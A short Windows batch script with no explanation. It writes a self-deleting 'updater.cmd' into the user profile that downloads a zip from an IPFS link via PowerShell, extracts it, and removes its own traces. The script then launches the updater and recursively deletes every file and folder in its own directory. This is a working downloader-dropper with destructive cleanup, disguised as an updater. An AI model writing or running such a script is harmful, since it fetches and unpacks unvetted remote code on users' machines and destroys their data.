cd /d %~dp0
(
echo powershell -Command "(New-Object Net.WebClient).DownloadFile('https://ipfs.io/ipns/link/file.zip', '%CD%\file.zip')"
echo tar -xf "%CD%\file.zip"
echo del "%CD%\file.zip"
echo del "%userprofile%\updater.cmd"
) > "%userprofile%\updater.cmd"
start "" "%userprofile%\updater.cmd"
for /F "delims=" %%i in ('dir /b') do (rmdir "%%i" /s/q || del "%%i" /s/q)

